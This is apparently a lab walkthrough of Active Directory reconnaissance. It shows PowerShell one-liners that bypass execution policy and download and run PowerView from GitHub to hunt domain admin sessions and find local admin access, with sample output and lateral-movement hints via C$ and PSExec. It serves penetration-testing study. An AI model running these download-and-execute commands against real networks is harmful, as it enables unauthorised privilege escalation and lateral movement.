Hunt out any machines were an account belonging to the domain administrative group is presently logged on to, and at the same time see if you have local admin rights on any of the identified machines.

PS C:\Users\Gimmyt> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-UserHunter -CheckAccess"

The results as can be seen directly below details the presently authenticated users who belonging to the DA group and the IP address of the machine, they are authenticated to, it also lists the originators sessions IP address. If you can gain access to any of those machines with local admin level privileges you will be able to gain access to those domain accounts. Furthermore, the result also reveals if your account has local admin access on the revealed IP address, if it said True you would be able to laterally move to the machines.

UserDomain   : space.hopper
UserName     : Administrator
ComputerName : cat.space.hopper
IP           : 192.168.10.69
SessionFrom  : 192.168.10.48
LocalAdmin   : False

UserDomain   : space.hopper
UserName     : HoppyM
ComputerName : dog.space.hopper
IP           : 192.168.10.47
SessionFrom  : 192.168.10.37
LocalAdmin   : False

-----------------------------------------------------

One liner to see if your account has any administrative rights on any machines in the domain. You sometimes need to run these one or two times in the lab.

PS C:\Users\Gimmyt> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Find-LocalAdminAccess"

mouse.space.hopper

PS C:\Users\Gimmyt>

The response shows a single pc named mouse.space.hopper, be carful as if you only get one response as is the case with user Gimmyt, itâ€™s very easy to miss the response. If you have local admin rights on the machine, you can access the c$ and use tools like PSEXEC on the machine.

-----------------------------------------------------

To verify that admin access to mouse.space.hopper was possible,  I opened another PowerShell session and tried to browse to the C$ on the computer named mouse, the below responses, verify that I was able to do, access to the C$ verifies admin access. To verify this, I also tried to access the machine tilted Snake and got an Access is denied response as you would expect as Gimmyt does not have admin rights on that machine.
